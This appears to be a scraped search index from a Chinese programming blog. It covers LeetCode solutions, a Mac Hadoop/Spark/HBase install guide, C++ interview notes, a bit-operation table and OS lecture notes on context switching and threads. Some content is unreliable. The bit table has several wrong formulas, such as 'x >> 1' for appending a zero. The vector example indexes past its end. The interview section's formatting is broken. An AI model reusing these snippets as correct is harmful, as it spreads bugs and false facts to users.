nums[i]和当前下标(i)插入到哈希表中，当数组元素已经存在于哈希表中时，说明找到了答案，返回哈希表值和当前下标。 1234567891011121314public class Q1TwoSum &#123; public static int[] twoSum(int[] nums, int target) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i&lt; nums.length; i++) &#123; if (map.containsKey(nums[i])) &#123; return new int[]&#123;map.get(nums[i]), i&#125;; &#125; else &#123; // key, value pairs map.put(target - nums[i], i); &#125; &#125; return new int[]&#123;&#125;; &#125;&#125; Pythonhash。用一个哈希表，存储每个数对应的下标，复杂度$O(n)$ 123456789101112131415class Solution: def twoSum(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: List[int] \"\"\" result = &#123;&#125; index = 0; for i in nums: if i in result: return [index, result[i]] else: result[target-i] = index index += 1;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"118. Pascal's Triangle","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-118-Pascal-s-Triangle/","text":"Given a non-negative integer numRows, generate the first numRows of Pascal’s triangle. In Pascal’s triangle, each number is the sum of the two numbers directly above it. Example: 123456789Input: 5Output:[ [1], [1,1], [1,2,1], [1,3,3,1], [1,4,6,4,1]] Java根据动画中的步骤，一层一层构建矩阵。 12345678910111213public List&lt;List&lt;Integer&gt;&gt; generate(int numRows) &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; numRows; i++) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(), prev = null; if (i &gt; 0) prev = res.get(i - 1); for (int j = 0; j &lt;= i; j++) &#123; if (j == 0 || j == i) list.add(1); else list.add(prev.get(j-1) + prev.get(j)); &#125; res.add(list); &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Mac环境下搭建Hadoop家族产品","date":"2017-09-29T16:00:00.000Z","path":"2017/09/30/awesome-Install-Mac环境下搭建Hadoop家族产品/","text":"1. 安装Hadoop上面步骤和条件如果都具备的话，就可以安装Hadoop了。Hadoop有三种运行模式：单机模式，伪分布式模式，分布式模式，这里设置的是伪分布式模式。 0 Java SDK在所有安装前，确认已经安装了JAVA JDK，并设置了JAVA_HOME。这里推荐使用HomeBrew安装JDK，因为HomeBrew可以非常方便的管理多个版本[Mac OS X and multiple Java versions]。 homebrew-cask 安装多个java版本 jenv 管理多个java版本 12345678910111213141516171819202122# 1. Install jenvbrew install jenv# 2. Add jenv to the bash profileif which jenv &gt; /dev/null; then eval \"$(jenv init -)\"; fi# 3. Add jenv to your pathexport PATH=\"$HOME/.jenv/shims:$PATH\"# 4. Tap \"caskroom/versions\"brew tap caskroom/versions# 5. Install the latest version of javabrew cask install java# 6. Install java 7 or 8 (whatever you need)brew cask install java6#brew cask install java7#brew cask install java8# 7. Add each path to jenv one-at-a-time.jenv add /Library/Java/JavaVirtualMachines/jdk-10.0.2.jdk/Contents/Home# 8. Check if jenv registered OKjenv versions# 9. Set java version to use (globaly)jenv global 10.0# 10. Check java versionjava -version 1.1 配置ssh配置ssh就是为了能够实现Hadoop的免密登录，这样方便远程管理Hadoop并无需登录密码在Hadoop集群上共享文件资源。如果你的机子没有配置ssh的话，在命令终端输入ssh localhost是需要输入你的电脑登录密码的。配置好ssh后，就无需输入密码了。 第一步就是在终端执行ssh-keygen -t rsa，之后一路enter键，当然如果你之前已经执行过这样的语句，那过程中会提示是否要覆盖原有的key，输入y即可。 第二步执行语句cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys用于授权你的公钥到本地可以无需密码实现登录。 理论上这时候，你在终端输入ssh localhost就能够免密登录了。 1.2 下载安装Hadoop这时候brew的好处就体现出来了，你无需到Hadoop官网去找下载链接，只要在命令终端输入brew install hadoop等命令执行完，你就可以看到在/usr/lcoal/Cellar目录下就有了hadoop目录，表示安装成功。 1.3 配置Hadoop1.3.1 配置HDFS地址和端口号进入目录/usr/local/Cellar/hadoop/3.1.0/libexec/etc/hadoop，打开core-site.xml将&lt;configuration&gt;&lt;/configuration&gt;替换为 1234567891011&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/usr/local/Cellar/hadoop/hdfs/tmp&lt;/value&gt; &lt;description&gt;A base for other temporary directories.&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; 1.3.2 配置mapreduce中jobtracker的地址和端口在相同的目录下，你可以看到一个mapred-site.xml文件。同样将文件中的&lt;configuration&gt;&lt;/configuration&gt;替换为 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;localhost:9010&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 1.3.3 修改hdfs备份数在相同目录下，打开hdfs-site.xml，同样的替换为 123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 变量dfs.replication指定了每个HDFS默认备份方式通常为3, 由于我们只有一台主机和一个伪分布式模式的DataNode，将此值修改为1。 1.3.4 格式化HDFS这个操作相当于一个文件系统的初始化，执行命令hdfs namenode -format。 出现提示输入Y/N时要输入大写Y。 1.4 配置Hadoop环境变量因为我用的是iTerm2和zsh，所以打开~/.zshrc添加 12export HADOOP_HOME=/usr/local/Cellar/hadoop/3.1.0/export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin 再执行source ~/.zshrc以确保配置生效。配置的目的是方便在任意目录下全局开启关闭hadoop相关服务，而不需要到/usr/local/Cellar/hadoop/3.0.0/sbin下执行。 1.5 启动/关闭Hadoop服务启动/关闭HDFS服务的命令为 12./start-dfs.sh ./stop-dfs.sh 启动/关闭YARN服务 12./start-yarn.sh ./stop-yarn.sh 启动/关闭Hadoop服务(等效上面两个) 12./start-all.sh ./stop-all.sh 通过访问以下网址查看hadoop是否启动成功 Node Information: http://localhost:9870 Resource Manager: http://localhost:8088 NodeManager : http://localhost:8042 这里要注意的是在3.1.0版本中http://localhost:50070转移到了http://localhost:9870. 1.6 配置yarnetc/hadoop/mapred-site.xml: 12345678910111213&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt;&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.application.classpath&lt;/name&gt; &lt;value&gt;$HADOOP_HOME/share/hadoop/mapreduce/*:$HADOOP_HOME/share/hadoop/mapreduce/lib/*&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; etc/hadoop/yarn-site.xml: 12345678910&lt;configuration&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.env-whitelist&lt;/name&gt; &lt;value&gt;JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 启动 1$ sbin/start-yarn.sh 2 安装Spark有了前面这么多的准备工作，终于可以安装Spark了。到Spark官网下载你需要的Spark版本，注意这里我们看到需要有依赖的Hadoop，而且还让你选择Hadoop的版本，这里默认即可。下载完直接双击压缩包就会解压，将其重命名为spark放到/opt下面。 毫无疑问，我们还需要一个环境参数配置，打开~/.zshrc添加 12export SPARK_HOME=/opt/sparkexport PATH=$PATH:$SPARK_HOME/bin 走到这一步，我们终于可以启动spark了，打开终端，输入spark-shell --master local, OK 3 安装 Hive下载hive后解压到指定目录，并添加路径 12export HIVE_HOME=/opt/apache-hive-x.y.z-binexport PATH=$PATH:$HIVE_HOME/bin 这样，初步安装就完成了，键入hive启动 hive shell 1$ hive hive&gt; 4 安装Zookeaper到官网下载zookeaper。 使用Zookeeper之前，需要有一个配置文件conf/zoo.cfg. 123tickTime=2000dataDir=/tmp/zookeeperclientPort=2181 启动Zookeeper 1bin/zkServer.sh start 5 安装KafkaKafka使用了scala和java语言，所以应该首先安装scala。到scala官网下载scala，选择Other ways to install Scala，点击下载binary。 到kafka官网下载kafaka，注意选择对应的scala版本。 6 安装HBase到官网下载Hbase，解压并设置好路径。 首先配置conf/hbase-env.sh文件，设置JAVA_HOME为正确的JAVA版本，设置export HBASE_MANAGES_ZK=false，使用我们自己的zookeeper。 配置conf/hbase.site文件，如下 1234567891011121314&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hbase.cluster.distributed&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.rootdir&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000/hbase&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt; &lt;value&gt;/tmp/zookeeper&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; hbase.rootdir为hbase的根目录，参见Hadoop中coresite.xml文件，即配置的端口号。 站点： http://localhost:16010/ 7 最简便的安装方式其实最简单的安装莫过于Vagrant方案了，搭建Vagrant虚拟机的过程见我的博文vagrant搭建ubuntu，在选择配置文件的时候，选择这里的配置文件。下载好配置文件后，在终端切换到配置文件所在文件夹，输入命令行 12vagrant upvagrant ssh 即可使用。当然使用其他的源或配置也可以，读者可以寻找适合自己的。 8 IntelliJ IDEA选择【File-Project Structure】, 点击左侧【Modules】，在右边切换到【Dependencies】选项卡，添加Hadoop的路径： 点击【+】，选择第一项（1 JARS or directories） 添加 share/hadoop/common，share/hadoop/common/lib，share/hadoop/hdfs，/share/hadoop/yarn，share/hadoop/mapreduce；","tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"http://larryim.cc/tags/Hadoop/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"7. Reverse Integer","date":"2017-08-31T16:00:00.000Z","path":"2017/09/01/Leetcode-7-Reverse-Integer/","text":"Given a 32-bit signed integer, reverse digits of an integer. Example 1: 12Input: 123Output: 321 Example 2: 12Input: -123Output: -321 Example 3: 12Input: 120Output: 21 Note:Assume we are dealing with an environment which could only hold integers within the 32-bit signed integer range. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows. Java我们可以一次构建反转整数的一位数字：每次弹出和推入一个数字。 弹出数字： tail = x%10; x = x/10 推入数字： newResult = newResult*10 + tail 难点在于如何判断溢出。官方的解答非常繁琐，其实有一种直接的方法：能不能再转换回原数字 1if ((newResult - tail) / 10 != result) return 0; 如果newResult溢出，肯定不能再转换回去了。 123456789101112public int reverse(int x) &#123; int result = 0; while (x != 0)&#123; int tail = x % 10; int newResult = result * 10 + tail; // check overflow if ((newResult - tail) / 10 != result) return 0; result = newResult; x = x / 10; &#125; return result;&#125; 但上述方法是一种trick，在其他情况下应用不好。而且要反复做除法，效率也比较低。下面是我想到的比较通用的一种解法，借鉴自Java库Integer.parseInt()中处理溢出的方法(详见本博客LeetCode 8. String to Integer (atoi)): 123456789101112131415161718192021public int reverse(int x) &#123; boolean isPositive = x &gt; 0 ? true : false; // 是否是整数 int limit = isPositive ? Integer.MIN_VALUE : -Integer.MAX_VALUE; // 数字下限 x = isPositive ? x : -x; // 转化为正数 int multmin = limit / 10; // 数字下限：用来判断乘法溢出 int result = 0; // 数字反转结果 int i = 0; // index while (x != 0) &#123; int tail = x % 10; // returns 0 when the reversed integer overflows. if (result &lt; multmin) return 0; result *= 10; // returns 0 when the reversed integer overflows. if (result &lt; limit + tail) return 0; result -= tail; x = x / 10; &#125; return isPositive ? - result : result;&#125; Python1234567891011121314151617181920212223242526272829class Solution: def reverse(self, x): \"\"\" :type x: int :rtype: int \"\"\" if x&lt;0: quotient = -x flag = -1 else: quotient = x flag = 1 reverse = [] scale = 1 while quotient != 0: quotient, mod = divmod(quotient, 10) print(quotient, mod) reverse.append(mod) scale *= 10 result = 0 for i in reverse: scale /= 10 result += scale*i result = int(result*flag) if result &lt; -2147483647-1 or result &gt; 2147483647: return 0 return result 12345678def reverse(self, x): \"\"\" :type x: int :rtype: int \"\"\" sign = lambda x: x and (1, -1)[x &lt; 0] r = int(str(sign(x)*x)[::-1]) return (sign(x)*r, 0)[r &gt; 2**31 - 1] 记住2147483647","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"EOF","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/C-EOF/","text":"In computing, end-of-file (commonly abbreviated EOF) is a condition in a computer operating system where no more data can be read from a data source. The data source is usually called a file or stream. EOF在Unix系统上对应的是Control-D，在Windows上是Control-Z。 例如下面输入2个数字的C++程序test.cpp: 123456789101112#include &lt;iostream&gt;int main()&#123; int x, y; while ( std::cin &gt;&gt; x &gt;&gt; y ) std::cout &lt;&lt; '/' &lt;&lt; x &lt;&lt; '/' &lt;&lt; y &lt;&lt; \"/\\n\"; if ( std::cin.eof() ) std::cout &lt;&lt; \"End of input\\n\"; else std::cout &lt;&lt; \"There was an error\\n\";&#125; 在输入两个字符5 6之后，打印出/5/6/，然后在键入ctrl-D即EOF，程序输出”End of input”，否则输出”There was an error”。 123456789$./test5 6/5/6/End of input$./test5 6/5/6/aThere was an error","tags":[{"name":"C","slug":"C","permalink":"http://larryim.cc/tags/C/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"136 Single Number","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/Leetcode-136-Single-Number/","text":"136. Single NumberGiven a non-empty array of integers, every element appears twice except for one. Find that single one. Note: Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? Example 1: 12Input: [2,2,1]Output: 1 Example 2: 12Input: [4,1,2,1,2]Output: 4 Java这道题目涉及位操作。^(xor, 异或): 当两个位不同时，输出true/1。异或的真值表： A B Output 0 0 0 0 1 1 1 0 1 0 1 0 所以对于整数来说： 1230 ^ 0 = 0 n ^ 0 = n n ^ n = 0 如果把题目中的所有整数接连异或，由于出现两次的数字异或结果为0，最后剩下的就是出现一次的数字。 123456public int singleNumber(int[] nums) &#123; int res = 0; for (int num : nums) res ^= num; return res; &#125; Python12345678910class Solution(object): def singleNumber(self, nums): \"\"\" :type nums: List[int] :rtype: int \"\"\" n = 0 for num in nums: n = n^num return n","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"137 Single Number II","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/Leetcode-137-Single-Number-II/","text":"Given a non-empty array of integers, every element appears three times except for one, which appears exactly once. Find that single one. Note:Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? Example 1: 12Input: [2,2,3,2]Output: 3 Example 2: 12Input: [0,1,0,1,0,1,99]Output: 99 Java这道题目是LeetCode 136 Single Number的扩展。其实LeetCode 136可以看成是这道题目的特例。为什么这么说呢？因为有一种通用的方法可以去除出现$n$次的整数。该方法使用位操作，具体来说就是如果整数出现$n$次，那么二进制表示的第$i$位数也出现$n$次，将第$i$位数加起来取$n$的余数肯定是0。用伪代码表示： 123for (num : nums) res += (num &gt;&gt; i) &amp; 1;assert res % n == 0; 那么如果把出现一次的那个数字也算上，第$i$位数加起来取$n$的余数肯定等于出现一次的数字第$i$位数。将每一位上的数合起来(|，按位或)，即得到那个数。 12345678910public int singleNumberII(int[] nums) &#123; int single = 0; for (int i = 0; i &lt; 32; i++) &#123; int iBit = 0; for (int num : nums) iBit += (num &gt;&gt; i) &amp; 1; single |= (iBit % 3) &lt;&lt; i; &#125; return single;&#125; 还有1中解法，比较好的解释在这里","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"STL中的vector<string>总结","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/C-Vector-string/","text":"vector在C++编程中经常会被使用。 ##初始化 12345678910111213141516171819202122232425#include &lt;string&gt;#include &lt;vector&gt;using namespace std;int main()&#123; // push_back的方式 vector&lt;string&gt; str1(4); str1.push_back(\"a\"); str1.push_back(\"b\"); str1.push_back(\"c\"); str1.push_back(\"d\"); // 类似于数组的方式 vector &lt;string&gt; str2(4); str2[1] = \"a\"; str2[2] = \"b\"; str2[3] = \"c\"; str2[4] = \"d\"; //使用构造函数的方式 string str3[] = &#123;\"a\", \"b\", \"c\", \"d\"&#125;; vector&lt;string&gt; v(str3, str3+4);&#125;","tags":[{"name":"Cpp","slug":"Cpp","permalink":"http://larryim.cc/tags/Cpp/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"268. Missing Number","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/Leetcode-268-Missing-Number/","text":"Given an array containing $n$ distinct numbers taken from 0, 1, 2, ..., n, find the one that is missing from the array. Example 1: 12Input: [3,0,1]Output: 2 Example 2: 12Input: [9,6,4,2,3,5,7,0,1]Output: 8 Note:Your algorithm should run in linear runtime complexity. Could you implement it using only constant extra space complexity? Java题目给定的数列的范围是$0\\sim n$，由于$n$是已知的(n=nums.length)，所以数列的和也是已知的。那么把给定数组加起来得到总和，减小的部分就是缺失的数字。 123456public int missingNumber(int[] nums) &#123; int n = nums.length; int sum = 0; for (int num: nums) sum += num; return n*(n + 1)/2 - sum;&#125; 另一种好的方法是使用位操作。原本一共有$n+1$个数字0, 1, 2, ..., n。数组一共有$n$个数，数组的下标也有$n$个数。如果数组是全的话(有$n+1$个数字)，数组中的数字和下表按位异或的结果应该等于0。现在缺失一个数字，那么按位异或的结果肯定就等于缺失的数字。 12345678public int missingNumber(int[] nums) &#123; int n = nums.length; int res = 0; res ^= n; // 异或数组下标n for (int i = 0; i &lt; n; i++) res ^= i ^ nums[i]; // 异或数组下标和数组中的数 return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"C++面试经典100题","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/C-C-面试经典100题/","text":"1. 请填写BOOL , float, 指针变量与“零值”比较的 if 语句提示：这里“零值”可以是0, 0.0 , FALSE 或者“空指针”。例如 int 变量 $n$ 与“零值”比较的if语句为： 12if ( n == 0 )if ( n != 0 ) 以此类推。 (1)请写出 BOOL flag 与“零值”比较的 if 语句：标准答案： 12345if ( flag )if ( !flag )``如下写法均属不良风格，不得分。 if (flag == TRUE)if (flag == 1 )if (flag == FALSE)if (flag == 0)123(2)请写出 `float x` 与“零值”比较的`if`语句：标准答案示例： const float EPSINON = 0.00001;if ((x &gt;= - EPSINON) &amp;&amp; (x &lt;= EPSINON)1234不可将浮点变量用`==`或`！=`与数字比较，应该设法转化成`&gt;=`或`&lt;=`此类形式。如下是错误的写法，不得分。 if (x == 0.0)if (x != 0.0)123(3)请写出 `char *p` 与“零值”比较的 `if` 语句：标准答案：对于空指针值，用`#NULL` 表示 if (p == NULL)if (p != NULL)12如下写法均属不良风格，不得分。 if (p == 0)if (p != 0)if (p)if (!)``` 2.32位C++程序，计算sizeof的值 sizeof(str) = 6; //字符串数组，大小是六个字节(加上’\\0’共六个)。sizeof(p) = 4; // 指针的内容就是一个指向目标地址的整数，所以不管指向char、int还是其他，32位机指针一律是4个字节。 sizeof(n) = 4; // int型变量是4个字节。右侧：sizeof(str) = 4; // 这里的str不再是100字节。当数组作为函数的参数进行传递时，也就是作为参数入栈，那么该数组自动退化成同类型的指针。sizeof(p) = 4; // 同样，指针类型一律4个字节。 3. long a=0x801010; a+5=?0x801010 用二进制表示 为：“ 1000 0000 0001 0000 0001 0000” ，十进制的值为 8392720 ，再加 上 5 就是 8392725 。 ##4. 用变量 a 给出下面的定义 一个有 10 个指针的数组，该指针是指向一个整型数的; 一个指向有 10 个整型数数组的指针 ; 一个指向函数的指针，该函数有一个整型参数并返 回一个整型数 ; 一个有 10 个指针的数组，该指针指向一个函数，该 函数有一个整型参数并返回一个整型数 ; int * a[10]; int (*a)[10] int (*a)(int); int (*a[10])(int)","tags":[{"name":"Cpp","slug":"Cpp","permalink":"http://larryim.cc/tags/Cpp/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"位操作","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/Algorithm-位操作/","text":"下面列举了一些常见的二进制位的变换操作。功能 | 示例 | 位运算 ———————|—————————|————-去掉最后一位 | (101101-&gt;10110) | x &gt;&gt; 1在最后加一个0 | (101101-&gt;1011010) | x &gt;&gt; 1在最后加一个1 | (101101-&gt;1011011) | x &lt;&lt; 1+1把最后一位变成1 | (101100-&gt;101101) | x or 1把最后一位变成0 | (101101-&gt;101100) | x or 1-1最后一位取反 | (101101-&gt;101100) | x xor 1把右数第k位变成1 | (101001-&gt;101101,k=3) | x or (1 &lt;&lt; (k-1))把右数第k位变成0 | (101101-&gt;101001,k=3) | x and not (1 &lt;&lt; (k-1))右数第k位取反 | (101001-&gt;101101,k=3) | x xor (1 &lt;&lt; (k-1))取末三位 | (1101101-&gt;101) | x and 7取末k位 | (1101101-&gt;1101,k=5) | x and (1 &lt;&lt; k-1)取右数第k位 | (1101101-&gt;1,k=4) | x &gt;&gt; (k-1) and 1把末k位变成1 | (101001-&gt;101111,k=4) | x or (1 &lt;&lt; k-1)末k位取反 | (101001-&gt;100110,k=4) | x xor (1 &lt;&lt; k-1)把右边连续的1变成0 | (100101111-&gt;100100000) | x and (x+1)把右起第一个0变成1 | (100101111-&gt;100111111) | x or (x+1)把右边连续的0变成1 | (11011000-&gt;11011111) | x or (x-1)取右边连续的1 | (100101111-&gt;1111) | (x xor (x+1)) &gt;&gt; 1去掉右起第一个1的左边 | (100101000-&gt;1000) | x and (x xor (x-1))","tags":[],"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://larryim.cc/categories/Algorithm/"}]},{"title":"260. Single Number III","date":"2017-08-16T16:00:00.000Z","path":"2017/08/17/Leetcode-260-Single-Number-III/","text":"Given an array of numbers nums, in which exactly two elements appear only once and all the other elements appear exactly twice. Find the two elements that appear only once. Example: 12Input: [1,2,1,3,2,5]Output: [3,5] Note: The order of the result is not important. So in the above example, [5, 3] is also correct. Your algorithm should run in linear runtime complexity. Could you implement it using only constant space complexity? Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"context switching","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-8-contect-switching/","text":"Context SwitchingNow: Why Are We Doing All This Stuff? CPU multiplexing: a historical perspective. Preemption and context switching. CPU Limitations: Number(Historically) There is only one! Why? Potentially the most expensive and complex component of the system! (Recently) You may have many. Why? Multiple cores have emerged as a solution to thermal- and energy-management issues caused by transistor density. But generally, even if you have more than one, there are fewer cores than tasks to be run. ##CPU LimitationsHow does the CPU compare to other parts of the system—memory, disks, etc.? It is way faster! Faster than memory—usually addressed on the processor through out-of-order execution. Way faster than disk—addressed by the operating system. Way faster than you!—partially addressed by the operating system. (Nothing the operating system can really do about your limitations.) Human Perceptual LimitationsCan you express these delays to a 1 GHz processor? 15 ms “rule of thumb”: 15,000,000 clock cycles! 40 ms based on 25 frames-per-second for “smooth” video: 40,000,000 clock cycles! 100 ms was the rule for old telephone systems, the delay point after which human conversation patterns start to break down: 100,000,000 clock cycles! Ancient History The Garden Long long ago, in a land before time, computers did not multitask. They did one thing at a time. That one thing had complete access to the machine in was running on. The operating system—​if there was one—​was really just a library of routines to make programming easier. All abstractions, no multiplexing. The Fall of Computing At some point more people wanted to use the computer. That was annoying, because the geeks didn’t have it all to themselves anymore, but they just told people to form a line. The Further Fall of Computing At some point people wanted to interact with the computer, even multiple people interacting with the computer at the same time! Now what were the geeks to do? Give the Geeks Some Credit They solved these problems by building operating systems. Scheduling evolved to meet the needs of computer users. The Rise of Multiprocessing Batch systems processed jobs in bulk, with predetermined input from files or other data sources. Interactive systems waited for input from users. Problems with Batch SchedulingRecall one of the “problems” with the CPU It is faster than other system components! What problem does this create for simple batch scheduling? Inefficiency! Usage of slower parts of the system will cause the CPU to stall waiting for them to finish. Solution: Context Switching Birth of the Operating System Operating systems emerged partly to hide delays caused by slow devices to keep the processor active. Hiding processor delays requires only cooperative scheduling: threads only stop running when they require a long-latency operation. Supporting Multiple Interactive UsersSupporting multiple users requires the notion that multiple tasks are running simultaneously or concurrently, either: One task per user for multiple users, or multiple tasks for a single user, or multiple tasks for multiple users. The Illusion of ConcurrencyHow is this accomplished? Remember human perceptual limits? The processors rapidly switches between tasks creating the notion of concurrency! We refer to these transitions as context switches. Implementing Context SwitchingFirst problem: how does the operating system get control? Hardware interrupts. Software interrupts. Software exceptions. But what if these things don’t happen? Timer Interrupts Timer interrupts generated by a timer device ensure that the operating system regains control of the system at regular intervals. Timer interrupts are the basis of preemptive scheduling: the operating system doesn’t wait for the thread to stop running, instead it preempts it. Rest of interrupt handling is unchanged. The Illusion of Concurrency Timer interrupts mean that a running thread may be stopped at any time. When the thread restarts we want it to appear that nothing has happened, that execution was not interrupted. Of course other parts of the system might have changed, but the CPU state should be identical. How do we do this? Saving Thread StateWhat does thread state consist of? Registers Stack We rely on memory protection to keep the stack unchanged until we restart the thread. OS/161 Example Saving thread state is the first thing that happens when the interrupt service routine is triggered. (Why?) Saved state is sometimes known as a trap frame. Context Switching Threads switch to a separate kernel stack when executing in the kernel. Why? The kernel doesn’t trust (or want to pollute) the user thread’s stack.","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"Threads and Thread Implementations","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-9-Threads-and-Thread-Implementations/","text":"ThreadsSo what is a thread? Registers Stack How are each of the following shared between threads or processes? Registers Stack Memory File descriptor table. Why Use Threads? Threads can be a good way of thinking about applications that do multiple things “simultaneously.” Threads may naturally encapsulate some data about a certain thing that the application is doing. Threads may help applications hide or parallelize delays caused by slow devices. Threads v. Processes Part IIGood example from Wikipedia: multiple threads within a single process are like multiple cooks trying to prepare the same meal together. Each one is doing one thing. They are probably doing different things. They all share the same recipe but may be looking at different parts of it. They have private state but can communicate easily. They must coordinate! MemeThe OS corruptedThe cake Aside: Threads v. Events While threads are a reasonable way of thinking about concurrent programming, they are not the only way—​or even always the best way—​to make use of system resources. Another approach is known as event-driven programming. Anyone who has done JavaScript development or used frameworks like node.js has grown familiar with this programming model. Events v. threads (over)simplified: Threads can block, so we make use of the CPU by switching between threads! Event handlers cannot block, so we can make use of the CPU by simply running events until completion. Naturally Multithreaded ApplicationsWeb server: Use a separate thread to handle each incoming request. Web browser: Separate threads for each open tab. When loading a page, separate threads to request and receive eachunique part of the page. Scientific applications: Divide-and-conquer “embarrassingly parallelizable” data sets. Why Not Processes? IPC is more difficult because the kernel tries to protect processes from each other. Inside a single process, anything goes! State (what?) associated with processes doesn’t scale well. Implementing ThreadsThreads can be implemented in user space by unprivileged libraries. This is the M:1 threading model, M user threads that look like 1 thread to the operating system kernel. Threads can be implemented by the kernel directly. This is the 1:1 threading model. Implementing Threads in User SpaceHow is this possible? Doesn’t involve multiplexing between processes so no kernel privilege required! How do I: Save and restore context? This is just saving and restoring registers. The C library has an implementation called setjmp()/longjmp() Preempt other threads? Use periodic signals delivered by the operating system to activate a user space thread scheduler. Aside: setjmp()/longjmp() WizardryWhat will the 